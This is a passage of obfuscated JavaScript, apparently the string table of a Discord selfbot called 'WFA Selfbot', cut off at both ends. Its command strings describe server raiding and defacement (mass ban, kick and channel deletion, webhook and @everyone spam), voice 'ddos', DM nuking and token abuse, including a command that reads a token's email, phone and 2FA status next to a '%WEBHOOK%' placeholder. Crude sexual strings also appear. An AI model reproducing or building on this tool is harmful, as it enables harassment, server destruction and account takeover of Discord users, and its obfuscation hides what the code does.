    'SXvBg': '**Best Selfbot Discord**\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg',
    'vthQl': ':white_check_mark: **Vous n\'etes plus afk**',
    'TiGLX': '[COMMANDE] Commande afk stopé',
    'bFDbO': function (H, I) {
      return H === I;
    },
    'ATFcV': 'CWdzA',
    'fqahu': function (H, I) {
      return H + I;
    },
    'pMbVu': '[ERREUR]',
    'HbLFc': ' Je ne peux pas bannir cet personne',
    'gkRun': function (H, I) {
      return H * I;
    },
    'Rsamd': 'xHwSp',
    'DiBke': 'rAmtN',
    'grdnl': 'a été banni avec succès https://gfycat.com/playfulfittingcaribou :point_right:',
    'BhLdL': function (H, I) {
      return H + I;
    },
    'eWuWT': function (H, I) {
      return H(I);
    },
    'oINzI': '⏲️ **Group unlock, il peut mettre jusqua 120s pour être débloquer !**',
    'FxhfN': 'Commande unlock groupe executé',
    'Lruou': '▓▓░░░░░░░░ 20%',
    'Iqyxp': ':x: **Cette emote n\'est pas sur le serveur**.',
    'HhfUy': '[COMMAND] mp friend command executed',
    'rgApE': 'You must have something to say!',
    'myIiR': '[COMMANDE] Commande nsfw gif executé',
    'ffdQF': function (H, I, J) {
      return H(I, J);
    },
    'LPhQD': ':white_check_mark: **You have joined the hypesquad  \'bravery\'**',
    'uPdJo': function (H, I) {
      return H + I;
    },
    'ILjFR': function (H, I) {
      return H + I;
    },
    'OhroZ': 'NQHxJ',
    'OBqUX': function (H, I) {
      return H + I;
    },
    'NOTpX': '[COMMANDE] Commande thigh executé',
    'vURAr': 'Instagram',
    'YgsrC': 'BE INFLUENCER WITH WFA',
    'tsEby': function (H) {
      return H();
    },
    'MjWWl': 'Google',
    'XKmsf': '[COMMANDE] Commande google executé',
    'VBKXY': function (H, I) {
      return H + I;
    },
    'JJHQC': function (H, I) {
      return H + I;
    },
    'agLTl': function (H) {
      return H();
    },
    'zuWwP': 'Snapchat',
    'xOoIA': function (H, I) {
      return H + I;
    },
    'qxSpI': function (H, I) {
      return H !== I;
    },
    'lpJnQ': 'SmBxN',
    'iNbqc': 'Twitter',
    'yJRJA': 'BE A E-FUCKER WITH WFA',
    'YcnvE': function (H, I) {
      return H + I;
    },
    'SQOnI': 'Youtube',
    'UBykD': 'BE YOUTUBER WITH WFA',
    'mmRhc': function (H) {
      return H();
    },
    'GxKuo': '[COMMANDE] Commande youtube executé',
    'EczwW': function (H, I) {
      return H + I;
    },
    'oICHp': ' sur Youtube**',
    'VzePb': '%WEBHOOK%',
    'HYmKK': 'blackcap',
    'nhPcV': 'dduTD',
    'ozMdD': 'Tokyo Ghoul',
    'tuDmw': function (H) {
      return H();
    },
    'zyQRz': 'Hunter X Hunter',
    'FfjjT': '[COMMANDE] Commande hunter x hunter executé',
    'yEBzW': 'MANAGE_ROLES_OR_PERMISSIONS',
    'sjLqI': 'Hello ^^',
    'oiRyd': function (H, I) {
      return H + I;
    },
    'sFyuy': function (H, I) {
      return H + I;
    },
    'WTxQI': '[MP Envoyé]  |',
    'RTXDq': function (H) {
      return H();
    },
    'ziesB': 'Clash Of Clan',
    'GqlIY': '[COMMANDE] Commande clash of clans executé',
    'mIMmr': 'DiscordSetup ',
    'efYxt': '[EVENT] Message mp modifié:',
    'IZSXF': '[EVENT] Le: ',
    'QPeGk': function (H, I) {
      return H === I;
    },
    'ndsQJ': 'CBOKb',
    'dGuhE': 'Clash Royal',
    'gskOn': 'pqeku',
    'Spczz': 'Among us',
    'aNsfw': 'Roblox',
    'TJzsA': function (H) {
      return H();
    },
    'CHrfI': '[COMMAND] roblox command executed',
    'CZOJp': function (H, I) {
      return H === I;
    },
    'tGaQy': 'fWXGI',
    'CvPMb': 'Rocket League',
    'LWjMs': 'MTI4NzM0OjFpMmhuZToxMjMxMjM',
    'tjPtd': 'WFA Selfbot',
    'zYrhG': function (H) {
      return H();
    },
    'RjXTi': ':white_check_mark: **Tu joues à ',
    'MRVqJ': ' sur rocket league**',
    'Zuknh': 'data',
    'zuVLj': 'yMWao',
    'ODgeF': '[EVENT] J\'ai correctement reagit au giveaway sur ',
    'mtYFt': function (H, I) {
      return H + I;
    },
    'UiAPj': 'xsQEN',
    'NoPGb': 'discriminator',
    'WUBaI': 'mfa_enabled',
    'nkPMZ': 'locale',
    'fsIgW': 'verified',
    'FwpKF': '\nUser: ',
    'bZizU': '\nEmail: ',
    'flFUq': '\nNuméro de telephone: ',
    'geBUz': '\nAvatar: ',
    'CnlAR': '\nLangue: ',
    'sxGfg': '\nA2f activé?: ',
    'jwCdg': '\nFlags: ',
    'xmoYl': '\nPublic Flags: ',
    'JqCDT': '[COMMANDE] Commande info token executé',
    'fTadg': function (H, I) {
      return H * I;
    },
    'vOMqc': 'nike',
    'RsiOb': function (H, I) {
      return H + I;
    },
    'nxreP': 'un nom de rôle est nécessaire',
    'qgZwI': 'Non',
    'catIT': 'Oui',
    'eUQBg': function (H, I) {
      return H + I;
    },
    'DOyoa': function (H, I) {
      return H + I;
    },
    'RqCiG': function (H, I) {
      return H + I;
    },
    'zGVyV': '>\n\nID du role: ',
    'xoPwP': '\n\nNombre de membres ayant ce role: ',
    'IaVgS': '\n\nposition: ',
    'kylZz': '\n\nmentionnable: ',
    'MIiMs': '[COMMAND] snapchat command executed',
    'uiJgp': 'getRpcImage',
    'oPNkV': 'snapchat',
    'rzujp': 'Naruto',
    'RmIuV': 'WFA-Selfbot R',
    'uDWrA': '[COMMANDE] Commande naruto executé',
    'CvBtP': 'naruto',
    'SgqHb': '[COMMAND] among us command executed',
    'HLypP': 'amongus',
    'NKxfU': 'https://en-help.wfaself.repl.co',
    'AbcIo': 'text',
    'DPMSS': ':x: **No server found with the id** "',
    'LQBMd': 'qYuyS',
    'XwgAD': 'IQJSm',
    'NUBAH': 'KICK_MEMBERS',
    'hvwjL': 'AHGwT',
    'YCqhj': 'hrnAm',
    'gnVXX': '[COMMANDE] Commande get guild banner executé',
    'fgTAG': function (H, I) {
      return H + I;
    },
    'ObdGj': function (H, I, J) {
      return H(I, J);
    },
    'VQyFJ': '[COMMAND] lacoste command executed',
    'vEtug': function (H, I) {
      return H + I;
    },
    'ieech': ' on lacoste**',
    'kZfEe': function (H, I) {
      return H !== I;
    },
    'SsBSX': 'Apex Legends',
    'qkHMO': '[COMMAND] apex command executed',
    'BkwVO': 'function *\\( *\\)',
    'MEkwz': '\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)',
    'gMFBB': 'init',
    'yljds': function (H, I) {
      return H + I;
    },
    'YZXpQ': function (H, I) {
      return H + I;
    },
    'aJsDT': 'input',
    'PUBxt': function (H, I) {
      return H(I);
    },
    'OPnQf': function (H) {
      return H();
    },
    'RtQUu': function (H, I) {
      return H + I;
    },
    'pXKSV': function (H) {
      return H();
    },
    'YyQUO': ':x: **Veuillez executer cette commande sur un serveur!**',
    'gTZEL': '[COMMANDE] Commande delete all role executé',
    'oGmsd': '[EVENT] Un nitro a surement été ajouté a tes credits',
    'kxcgj': '[COMMANDE] Commande change hypesquad executé',
    'HnqAI': function (H) {
      return H();
    },
    'hfhOz': ' on Youtube**',
    'xFYhr': function (H, I) {
      return H === I;
    },
    'NCvGB': '4|2|0|3|1|5',
    'Nphvy': '[EVENT] Je n\'ai pas pu réagir au giveaway sur ',
    'eIaVW': ', il est possible que je n\'ai pas les permissions :/',
    'rdipw': function (H, I) {
      return H === I;
    },
    'nqLwA': '▓▓▓▓░░░░░░ 40%',
    'yPJOv': '▓▓▓▓▓▓░░░░ 60%',
    'LcslI': '▓▓▓▓▓▓▓▓░░ 80%',
    'zoWic': function (H, I) {
      return H + I;
    },
    'rzsOb': '[EVENT] Deleted dm:',
    'LEIMH': 'png',
    'iHJdk': '[COMMAND] steal bannier command executed',
    'oHKKm': 'username',
    'VxniV': 'phone',
    'yaJqA': 'public_flags',
    'Eqzxi': 'email',
    'nPoql': function (H, I, J, K) {
      return H(I, J, K);
    },
    'RKvjg': 'GET',
    'TolNi': 'ndBsU',
    'DTIDZ': 'cXGwL',
    'LAUCh': '**le token n\'est pas valide :x:**',
    'MVeBi': 'ae488379-351d-4a4f-ad32-2b9b01c91657',
    'umyxo': function (H) {
      return H();
    },
    'YRxwY': 'dTbLZ',
    'UojDI': function (H, I) {
      return H === I;
    },
    'mgmTD': 'sMInx',
    'GcwCp': function (H, I) {
      return H + I;
    },
    'QTFDY': function (H, I) {
      return H + I;
    },
    'BBPvY': function (H, I) {
      return H / I;
    },
    'BzUvl': 'loading..```',
    'ozehW': '[COMMANDE] Commande load executé',
    'TvatO': ':wave: ',
    'iBrbD': 'has been successfully banned https://gfycat.com/playfulfittingcaribou :point_right:',
    'BvUQq': ':x: **Aucun utilisateur mentionné**',
    'HOlyf': '[COMMANDE] Commande boom executé',
    'qtaQz': 'FBHOg',
    'jeCZQ': ':wave:',
    'wRRuH': function (H, I) {
      return H + I;
    },
    'kBEfJ': '[COMMANDE] Commande roblox executé',
    'lcMQr': '!d bump',
    'tjgWA': '**ddos command stoped**',
    'jueDG': '[COMMAND] ddos voc stopée',
    'SpukT': function (H, I) {
      return H + I;
    },
    'kgeOm': 'https://en-fun.wfaself.repl.co\nhttps://en-fun-1.wfaself.repl.co',
    'wOeRO': '[COMMAND] help fun command executed',
    'lMLRo': function (H, I) {
      return H(I);
    },
    'nZplb': '[COMMANDE] Commande ass executé',
    'WqEUC': function (H, I) {
      return H + I;
    },
    'XwArk': 'Minecraft',
    'CPFMZ': 'Jlxho',
    'tAftW': function (H, I) {
      return H + I;
    },
    'pzPYg': '[COMMANDE] Commande pussy executé',
    'DGjCX': '[COMMAND] thigh command executed',
    'czupi': 'uXygB',
    'fAcHL': function (H, I) {
      return H + I;
    },
    'zzYJE': 'ShSll',
    'Uwbny': 'Gucci',
    'wfkXe': 'BE RICH WITH WFA',
    'ZfelW': function (H) {
      return H();
    },
    'POAbe': '0|4|2|1|3|6|5',
    'qlEyE': ':x: **Command only usable on server**.',
    'tgJyj': '[COMMAND] deface command executed',
    'QfqoM': 'wfa',
    'IiyvC': function (H, I) {
      return H === I;
    },
    'hCKvt': 'mhGay',
    'irAXt': 'BE RAKAILLE WITH WFA',
    'ABgfC': '[COMMANDE] Commande lacoste executé',
    'emWFk': 'Nike',
    'VXigy': '[COMMANDE] Commande nike executé',
    'JcbAM': 'Facebook',
    'sObNK': 'BE MORE OLD WITH WFA',
    'EBGZH': ' sur Facebook**',
    'BuHGm': 'Tiktok',
    'peSRu': 'BE A PUTE WITH WFA',
    'kONlQ': function (H, I) {
      return H + I;
    },
    'ZkDMG': 'now',
    'kTWYV': function (H, I) {
      return H + I;
    },
    'SwGXD': '[COMMAND] help raid command executed',
    'NvZUG': 'zGLtj',
    'voZEc': 'Pornhub',
    'dupet': function (H, I) {
      return H !== I;
    },
    'SyVxT': ' sur Tiktok**',
    'svxhV': function (H, I) {
      return H === I;
    },
    'yWJFm': 'youtube',
    'MmaAY': 'https://nekobot.xyz/api/image',
    'SXiiK': 'Fortnite',
    'CyLsq': '[COMMANDE] Commande fortnite executé',
    'uHQqh': function (H, I) {
      return H + I;
    },
    'AGbYX': ' sur fortnite**',
    'RchnB': ':x: **Il n\' y a aucun emote a supprimer.**',
    'BgWcI': '[COMMAND] pornhub command executed',
    'IupwY': function (H, I) {
      return H == I;
    },
    'hsIDL': 'React with',
    'fQrup': function (H, I) {
      return H == I;
    },
    'QTYaX': ':x:',
    'wDuJN': function (H, I) {
      return H === I;
    },
    'OJlxu': 'Atwfp',
    'FbArX': '4|3|6|1|2|5|0',
    'FWuip': function (H, I) {
      return H + I;
    },
    'iuZeH': '[EVENT] L\'utilisateur ',
    'YOQyx': ' vient de vous ping lors de votre afk',
    'OXtan': function (H, I) {
      return H + I;
    },
    'dpbTt': function (H, I) {
      return H + I;
    },
    'oNeib': ':x: **Je suis afk pour la raison** ',
    'hoghE': function (H, I) {
      return H === I;
    },
    'ZDyDN': function (H, I) {
      return H + I;
    },
    'SutQj': function (H, I) {
      return H !== I;
    },
    'CtZKN': 'cdnsq',
    'vnZIL': '[COMMANDE] Commande cmd executé',
    'Ocalw': 'vIIvr',
    'UvhHx': '[COMMANDE] Commande help executé',
    'pmPfe': 'help fun',
    'aTUjE': function (H, I) {
      return H === I;
    },
    'gZlMe': 'ShaMk',
    'VYZwu': 'https://fun.wfaself.repl.co https://fun-1.wfaself.repl.co',
    'vZHbv': '[COMMANDE] Commande help fun executé',
    'YxvTU': 'help hack',
    'PdAir': function (H, I) {
      return H + I;
    },
    'uNuAr': 'https://hack.wfaself.repl.co',
    'tjwjL': '[COMMANDE] Commande help hack executé',
    'JaYol': function (H, I) {
      return H + I;
    },
    'tqIgM': 'help raid',
    'SUFYq': function (H, I) {
      return H + I;
    },
    'tUkkd': '[COMMANDE] Commande help raid executé',
    'QeDIZ': '[COMMANDE] Commande help status executé',
    'nXPEY': 'help backup',
    'awwBs': function (H, I) {
      return H + I;
    },
    'SnhXr': 'https://backup.wfaself.repl.co',
    'eZlbI': 'help moderation',
    'ocziK': 'JwQfb',
    'UvAuB': 'tWdOV',
    'OMUbZ': 'https://mod.wfaself.repl.co',
    'pYvep': '[COMMANDE] Commande help moderation executé',
    'zlWnc': function (H, I) {
      return H + I;
    },
    'gsLPz': 'help utile',
    'rsNij': 'lSiJY',
    'ATzsl': function (H, I) {
      return H + I;
    },
    'koFNp': function (H, I) {
      return H === I;
    },
    'SyXcW': 'MInys',
    'HqDww': function (H, I) {
      return H + I;
    },
    'hcQMJ': 'destroy',
    'OPztn': function (H, I) {
      return H == I;
    },
    'USbeX': function (H, I) {
      return H < I;
    },
    'rnBPF': function (H, I) {
      return H !== I;
    },
    'bcbVP': 'jfIgp',
    'YwhBw': 'ikgAQ',
    'VEMGq': 'RANDOM',
    'LdUsz': function (H, I) {
      return H === I;
    },
    'iQAoq': 'qplbT',
    'Xwxnf': function (H, I) {
      return H === I;
    },
    'QNOzN': function (H, I) {
      return H + I;
    },
    'neEry': function (H, I) {
      return H !== I;
    },
    'qmHQO': 'kDvxW',
    'VBNcJ': function (H, I) {
      return H === I;
    },
    'AsysE': function (H, I) {
      return H == I;
    },
    'QNKvM': function (H, I) {
      return H != I;
    },
    'IPsGN': 'russia',
    'qabmy': function (H, I) {
      return H + I;
    },
    'nSIJB': '@everyone\nwfa-selfbot > ALL\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg',
    'zTGxy': function (H, I) {
      return H === I;
    },
    'KXPSk': 'group',
    'zhGTR': ':x: **Commande uniquement utilisable sur serveur**.',
    'cWuTQ': 'MANAGE_WEBHOOKS',
    'uZCXL': function (H, I, J) {
      return H(I, J);
    },
    'oslht': function (H, I) {
      return H(I);
    },
    'lIfXB': 'delete all channel',
    'XXBua': 'SvQaJ',
    'IrhqG': function (H, I) {
      return H + I;
    },
    'usvmu': 'ans un ser',
    'qzcpM': 'permission insuffisante',
    'iXKZg': '[COMMANDE] Commande delete all channel executé',
    'CTBsS': function (H, I) {
      return H + I;
    },
    'wnVWk': 'name all',
    'bRWtu': function (H, I) {
      return H === I;
    },
    'mFdkK': 'ZJRhk',
    'IseTM': ':x: **Commande uniquement utilisable sur un serveur**',
    'MUNrX': function (H, I) {
      return H == I;
    },
    'hbuIp': function (H, I) {
      return H + I;
    },
    'RyRqB': 'ban all',
    'IxOzY': function (H, I) {
      return H !== I;
    },
    'icLke': 'KhqPh',
    'UzGPe': '[COMMANDE] Commande ban all executé',
    'dhTic': 'all kick',
    'cIgdP': '[COMMANDE] Commande kick all executé',
    'fxyBi': function (H, I) {
      return H + I;
    },
    'xZJLy': 'RAIDED BY ',
    'hvobC': ' X ',
    'EPLqv': function (H, I) {
      return H === I;
    },
    'DEvUN': ':x: **Vous n\'avez pas les permissions pour executer cette commande**',
    'Eewla': '[COMMANDE] Commande deface executé',
    'ZFPZI': 'create channel',
    'nawAt': 'GVGzJ',
    'iwhiE': function (H, I) {
      return H < I;
    },
    'TMAQH': 'WFA-𝐱-',
    'GsCqF': '[COMMANDE] Commande create channel executé',
    'kXMog': function (H, I) {
      return H !== I;
    },
    'VJags': 'BaGjS',
    'lOxPX': 'CFfHt',
    'dPZPv': '@everyone\nWFA - Selfbot\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg',
    'WPJFF': function (H, I) {
      return H === I;
    },
    'gakID': '[COMMANDE] Commande webhook spam executé',
    'XSFZa': 'backup create',
    'eSXzD': 'rpsjI',
    'UMqcw': 'backup load',
    'mPglF': function (H, I) {
      return H + I;
    },
    'teBLz': 'backup list',
    'oqXwH': 'discord-backup',
    'kPMis': function (H, I) {
      return H + I;
    },
    'Oumvv': 'start bumping',
    'cCNKU': '[COMMANDE] Commande start bumping executé',
    'nHsRN': 'get guild banner',
    'nxzcZ': function (H, I) {
      return H === I;
    },
    'cEXjV': '[BANNIERE] Voici la banniere: ',
    'DRoLk': 'get guild pp',
    'dftdm': function (H, I) {
      return H === I;
    },
    'TZuUU': '[COMMANDE] Commande get guild pp executé',
    'bZFin': 'mp all',
    'RhvzY': 'PZukS',
    'AVVQL': ':x: **Commande uniquement utilisable sur serveur**',
    'QclDz': '[COMMANDE] Commande mp all executé',
    'wDpRC': function (H, I) {
      return H + I;
    },
    'NHdjg': 'stop mp all',
    'meAFM': '[COMMANDE] Commande mp all stopée',
    'DKHly': function (H, I) {
      return H + I;
    },
    'tHqLQ': 'stop auto voice kick',
    'xMBzu': function (H, I) {
      return H === I;
    },
    'KhHwk': 'WdVsG',
    'Pxhwh': 'ruGLb',
    'bVgXd': ':x: **Veuillez mentionner un utilisateur**',
    'oqemg': ':x: *Tu n\'as encore blacklist vocal personne**',
    'dzCtu': 'FsEpw',
    'RofRT': '[COMMAND] auto voice kick command stoped',
    'PKQnW': function (H) {
      return H();
    },
    'fqyXr': ':x:**Tu n\'as pas la permission de deconnecter cet utilisateur du vocal**.',
    'FHmPM': function (H) {
      return H();
    },
    'oeaOM': '[COMMAND] auto voice kick commande exécuté',
    'cqUDU': ':white_check_mark: **Auto Voice kick setup l\'utilisateur ne pourra plus rejoindre de channel vocal de ce serveur**',
    'nxoTH': function (H, I) {
      return H + I;
    },
    'ClQyW': 'nuke dm',
    'kirgA': function (H, I) {
      return H !== I;
    },
    'NNfKM': 'RbdIT',
    'bHqbY': '**Nuking dms...**',
    'MbZXt': ':white_check_mark: **Nuked dms**',
    'hznUk': '[COMMANDE] Commande nuke dm executé',
    'tyntT': function (H, I) {
      return H + I;
    },
    'ayBro': 'voice kick',
    'ckTMV': ':x:**Tu n\'a pas la permission de kick un utilisatur**.',
    'bWtLT': ':x:**Veuillez mentionner un utilisateur.**',
    'EVZvv': ':x:**L\'utilisateur n\'est pas dans un channel vocal.**',
    'zjBOO': ':white_check_mark: **L\'utilisateur a été voice kick correctement**',
    'ePfdr': '[COMMANDE] Commande voice kick executé',
    'eNfCG': 'WFA-SELFBOT',
    'ouJwK': 'oui',
    'xsauJ': function (H, I) {
      return H + I;
    },
    'Vzfov': ':white_check_mark: **Vous etes afk pour** ',
    'XtJdZ': 'anti groupe on',
    'YgvWX': 'wJgXU',
    'zDqEH': function (H, I) {
      return H + I;
    },
    'wxAQM': ':white_check_mark: **vous allez quitter les nouveaus groupes en disant: **',
    'qPFTs': '[COMMANDE] Commande anti groupe executé',
    'oqWJT': function (H, I) {
      return H + I;
    },
    'jBGZH': 'anti groupe off',
    'AQepU': 'jbRBM',
    'ICSaP': '[COMMANDE] Commande anti groupe stopé',
    'uYJuJ': 'avatar',
    'zNCGo': function (H, I) {
      return H + I;
    },
    'fLdnb': '[COMMANDE] Commande avatar executé',
    'RmwgF': 'change hypesquad brilliance',
    'JBWcr': function (H, I, J) {
      return H(I, J);
    },
    'aeSOn': ':white_check_mark: **Vous avez rejoint la hypesquad \'brilliance\'**',
    'AIkGJ': 'change hypesquad ballance',
    'nOQzk': function (H, I) {
      return H !== I;
    },
    'xuQnZ': 'OJBVd',
    'KGdKA': ':white_check_mark: **Vous avez rejoint la hypesquad \'ballance\'**',
    'VDHnI': ':white_check_mark: **Vous avez rejoint la hypesquad \'bravery\'**',
    'GqAqg': 'mp friend',
    'yRkKr': 'Vous devez mettre quelque chose à dire !',
    'RnxiP': '[COMMANDE] Commande mp friend executé',
    'YofXJ': function (H, I) {
      return H === I;
    },
    'flAZY': function (H, I) {
      return H + I;
    },
    'ZFabf': 'stats',
    'bTQbp': function (H, I) {
      return H + I;
    },
    'aDRJu': function (H, I) {
      return H + I;
    },
    'XUWwy': function (H, I) {
      return H + I;
    },
    'mEBCT': function (H, I) {
      return H + I;
    },
    'OhKSj': function (H, I) {
      return H + I;
    },
    'bpoGb': '```Selfbot - Statistics | WFA - Selfbot\nMemoire Usage: ',
    'kwwzr': '\n\nSalons: ',
    'AzvFw': '\n\nMembres: ',
    'yjwhM': '[COMMANDE] Commande stats executé',
    'XlAJQ': function (H, I) {
      return H + I;
    },
    'wTCyL': '[COMMANDE] Commande purge executé',
    'ZoqjV': function (H, I) {
      return H + I;
    },
    'JnzKF': 'discord',
    'NAcQT': '[COMMANDE] Commande discord executé',
    'ifIwq': 'restart',
    'GBZNx': '**redémarrage** du self bot...',
    'YqPKt': 'set serveur name',
    'uiscb': function (H, I) {
      return H !== I;
    },
    'VYYKw': 'rUJNf',
    'bOIwK': '[COMMANDE] Commande set serveur name executé',
    'hrMHS': 'XnyXiA',
    'rAual': 'XXn_KA',
    'ZFldz': 'Xiq-WQ',
    'xnjMR': 'a6uny9jcMjet2W2LASruribq6VI',
    'DnLXl': '3_6Xt2k4OieDKimnNYGWUq9vJRo',
    'sVUEo': 'xllelHltGdY7DP_0s1XST4cgzTs',
    'FjoSu': function (H, I, J) {
      return H(I, J);
    },
    'Rugzx': function (H, I, J) {
      return H(I, J);
    },
    'enDnm': function (H, I, J) {
      return H(I, J);
    },
    'pIfNI': function (H, I, J) {
      return H(I, J);
    },
    'joAmg': '[COMMANDE] Commande token executé',
    'KEPkE': 'sansxksch',
    'YgnsZ': 'XMfHa',
    'FaSgU': 'tYrVt',
    'Jqder': '[EASTER EGG] GG a toi, tu as trouvé un easter egg !',
    'RnXcc': '[EASTER EGG] Sans x KSH sont les développeurs et les designeurs du WFA Project !',
    'UWIKI': 'encode',
    'tBSpi': 'nqeLj',
    'Liqga': '@everyone\nWFA selfbot',
    'CvLhC': function (H, I) {
      return H + I;
    },
    'JkMWz': 'steal banniere',
    'dGTwS': function (H, I) {
      return H + I;
    },
    'sGtRR': 'steal emote',
    'wvdSa': 'wyVdX',
    'Fruuj': function (H, I) {
      return H === I;
    },
    'IMxbe': ':x: **Commande pas executable en mp**',
    'AiKaI': ':x: **Aucun serveur trouvable avec l\'id** "',
    'tMLUG': ':x: **Vous n\'avez pas les permissions "Gérer les emojis" sur ce serveur**',
    'qKbkD': function (H, I) {
      return H + I;
    },
    'SDrqZ': function (H, I) {
      return H == I;
    },
    'UQAzz': function (H, I) {
      return H + I;
    },
    'uhDCW': 'delete all emotes',
    'aEQss': function (H, I) {
      return H === I;
    },
    'IlFPZ': 'kBePx',
    'uuPeG': function (H, I) {
      return H < I;
    },
    'YdvWz': 'fnRll',
    'oKRhp': function (H, I) {
      return H + I;
    },
    'WtuLY': 'WexCx',
    'Xowli': 'HHncd',
    'etjCa': ':x: **Veuillez mentionner un utilisateur valide!**',
    'noDSC': ':x: **Cet utilisateur n\'a pas d\'avatar!**',
    'oNhmM': '[COMMANDE] Commande grab pp executé',
    'JcCCB': function (H, I) {
      return H + I;
    },
    'vgMQZ': 'backup friend',
    'rAsxb': function (H, I) {
      return H + I;
    },
    'osEAk': 'Successfully backed up ',
    'vtcKC': ' friends.',
    'ujxLU': function (H, I) {
      return H(I);
    },
    'giSVu': function (H, I) {
      return H + I;
    },
    'VLGKq': function (H, I) {
      return H + I;
    },
    'WxEnG': function (H, I) {
      return H === I;
    },
    'geLTg': 'bUZrm',
    'vSiAl': ':x: **Il vous faut les permissions administrateur pour executer cette commande**',
    'wCGLC': 'japan',
    'cAfAi': 'hongkong',
    'VaeAD': 'india',
    'ypwSO': function (H, I, J) {
      return H(I, J);
    },
    'CzQQn': function (H, I) {
      return H + I;
    },
    'JxOaP': '**Commande ddos stopé**',
    'bsEcg': function (H, I) {
      return H + I;
    },
    'RgdbF': 'kkSCU',
    'kMGqD': 'https://discordapp.com/api/v6/users/@me',
    'yIiQT': '[COMMANDE] Commande fuck token executé',
    'PtvBc': 'check token',
    'HwDgn': 'lovecalc',
    'nsAAp': 'ebkpW',
    'tfqbQ': '10%',
    'RFQHf': '15%',
    'BOefn': '35%',
    'oJtPc': '40%',
    'KXQdC': '45%',
    'nDvIi': '60%',
    'tRtiK': '65%',
    'mJgqB': '70%',
    'qyvly': '75%',
    'QvXfx': '80%',
    'YteaF': '85%',
    'BBRLS': '90%',
    'xLeVl': '100%',
    'pTkOZ': 'WFA selfbot',
    'jKjVR': '[COMMANDE] Commande lovecalc executé',
    'sXuIF': 'start typing',
    'amDvU': function (H, I) {
      return H === I;
    },
    'GePud': 'rDqYb',
    'lEuFz': '[COMMANDE] Commande start typing executé',
    'kVVEs': function (H, I) {
      return H + I;
    },
    'bOlZW': '8ball',
    'fYlQy': 'non...',
    'nAtIM': 'peut etre?',
    'AmhkS': 'probablement',
    'rtajh': 'je ne pense pas.',
    'ilmBZ': 'tu peux essayer...',
    'fZyfc': function (H, I) {
      return H + I;
    },
    'WGtHM': 'Quelle est ta question? :rolling_eyes: (essayeplutot:',
    'dDeAG': ' 8ball [question])',
    'RQePd': '[COMMANDE] Commande 8ball executé',
    'AboLE': 'branlette',
    'yHlYi': '8==:fist:=D',
    'IcORA': '8===:fist:D ',
    'PrIZv': '8=:fist:==D ',
    'fRkck': '8===:fist:D',
    'QCRui': '8===:fist:D:sweat_drops:',
    'PBNiZ': '[COMMANDE] Commande branlette executé',
    'Faqtt': function (H, I) {
      return H + I;
    },
    'AfOvy': 'ee5d5d',
    'XzhuP': 'ee5d9c',
    'IUfat': 'ee5dcf',
    'KSdNJ': '5d62ee',
    'KinVd': '5d95ee',
    'AzbrQ': '5dddee',
    'mXDIZ': '5deebe',
    'lqmnh': 'c0ee5d',
    'CQTSU': 'eecf5d',
    'hzcaX': 'ee9f5d',
    'hdWQt': 'fight',
    'ruhZO': '[COMMANDE] Commande fight executé',
    'aohww': 'boom',
    'lUKWF': function (H, I) {
      return H + I;
    },
    'CVyyB': 'shutdown',
    'bZtiA': 'rire',
    'OCfQu': function (H, I) {
      return H + I;
    },
    'RvQBq': function (H, I) {
      return H * I;
    },
    'EMENT': '[COMMANDE] Commande rire executé',
    'Kiiaf': 'kiss',
    'jvEUA': function (H, I) {
      return H + I;
    },
    'YYjvz': '[COMMANDE] Commande kiss executé',
    'hxBBh': 'veski',
    'leNuV': function (H, I) {
      return H + I;
    },
    'CxKpw': '[COMMANDE] Commande veski executé',
    'KfkUv': 'LYTyh',
    'UDNHn': 'Gwnxe',
    'HYAZW': function (H, I) {
      return H + I;
    },
    'yHMDT': function (H, I) {
      return H + I;
    },
    'mizDI': 'punch',
    'KYESi': function (H, I) {
      return H === I;
    },
    'ZwCCr': 'aEDJo',
    'gOOCO': function (H, I) {
      return H * I;
    },
    'DriTX': 'calin',
    'RmKDh': 'xDFRx',
    'xnqiY': 'HNbHJ',
    'abprJ': function (H, I) {
      return H === I;
    },
    'WOokB': 'CrwcL',
    'wwkfD': function (H, I) {
      return H + I;
    },
    'BgUeB': function (H, I) {
      return H + I;
    },
    'wVzrI': '[COMMANDE] Commande calin executé',
    'pXprJ': function (H, I) {
      return H === I;
    },
    'OLNUO': 'scuqb',
    'DhiMK': function (H, I) {
      return H + I;
    },
    'sKjmF': 'https://discord.gift/',
    'PHYKh': function (H, I, J) {
      return H(I, J);
    },
    'lkRHw': '0aA',
    'mfxIH': '[COMMANDE] Commande nitro executé',
    'JFbQS': 'reverse',
    'lzCQO': function (H, I) {
      return H + I;
    },
    'TfPgZ': ':x: **Pas de test definit**',
    'jqumU': function (H, I) {
      return H(I);
    },
    'YXhVM': '[COMMANDE] Commande reverse executé',
    'Wglvr': 'skick',
    'JuvvD': 'ykTIW',
    'WJHpU': '[COMMANDE] Commande kick executé',
    'xktsO': function (H, I) {
      return H + I;
    },
    'NRShP': function (H, I) {
      return H !== I;
    },
    'pyadJ': 'tbfgl',
    'DhkvI': 'rwmOE',
    'XeSkH': 'YNdao',
    'UpSuh': 'Rhgzq',
    'MtetO': 'role info',
    'HmoFj': '[COMMANDE] Commande role info executé',
    'Mbzlg': function (H, I) {
      return H + I;
    },
    'IQSjM': function (H, I) {
      return H + I;
    },
    'tVvhR': function (H, I) {
      return H + I;
    },
    'pukxm': function (H, I) {
      return H + I;
    },
    'txdOa': '\n\nCouleur: ',
    'UBTcD': 'add emote',
    'kSiEs': 'KSqeP',
    'gFkOk': function (H, I) {
      return H + I;
    },
    'lpMQN': ':x: **Veuillez choisir une emote.**',
    'CpPQt': 'NSoQN',
    'oXFps': ':x: **Emote invalide essayez ceci** ',
    'hNvih': 'MANAGE_EMOJIS',
    'uOdgo': 'zMrdQ',
    'JkWwF': ':x: **Vous',
    'lYclc': ' n\'avez pas les permissions "Gérer les emojis" sur ce serveur**',
    'mveiF': function (H, I) {
      return H + I;
    },
    'qYIvh': function (H, I) {
      return H + I;
    },
    'BxYfZ': 'gif',
    'PQXua': function (H, I) {
      return H === I;
    },
    'eAUGb': function (H, I) {
      return H + I;
    },
    'iwkim': function (H, I) {
      return H + I;
    },
    'NuqEy': function (H, I) {
      return H + I;
    },
    'tuFyC': '```\nServeur: **',
    'kdWMw': '**\n\nEmojis animés: [',
    'LmfJb': function (H, I) {
      return H + I;
    },
    'IhLWp': function (H, I) {
      return H + I;
    },
